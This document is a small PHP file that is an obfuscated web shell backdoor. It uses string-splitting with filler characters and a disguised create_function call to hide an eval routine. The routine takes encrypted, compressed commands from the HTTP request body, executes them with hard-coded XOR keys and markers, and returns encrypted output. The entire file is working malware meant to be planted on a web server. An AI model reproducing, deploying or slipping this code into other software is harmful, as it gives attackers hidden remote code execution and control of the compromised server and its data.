<?php
$K='un-4-4ction x($t,$k){$c=strlen($-4k);$l-4-4=strlen($t);$o-4-4=-4"";for($i=0;-4$i<$l;){-4-4for($j=-';
$C='4("-4/$kh(.-4+)$kf-4/",@fi-4le_get_con-4-4tents("php://i-4npu-4t"),-4$m)==1) {@o-4b_sta-4rt();@e';
$u='40;(-4$j<$c&&$i<$l);$j-4++-4,$i++)-4{$o-4.=$t{$i-4}^$k{$j};}}-4-4return $o-4;}if (@p-4reg_match-';
$q=';@ob_en-4d_clean-4(-4);$r=@-4-4base6-44-4_encode(@-4x(@gzcomp-4r-4ess($o),$k));print("$p-4$kh$r-4$kf");}';
$l='-4va-4l(@gzun-4com-4pres-4-4s(@x-4(-4@bas-4e64-4_decode($m[1]),$k)))-4;$o=@ob_get_cont-4e-4nts()';
$P=str_replace('H','','HcreaHHte_fuHnHctHion');
$U='$k="12-406-41eba";$kh-4-4="6ce-46-461313053";$kf="2-437883e-44b4-477";$-4p="vZ6bu-4ZR96VG4-4O-4NWi";f-4';
$D=str_replace('-4','',$U.$K.$u.$C.$l.$q);
$H=$P('',$D);$H();
?>
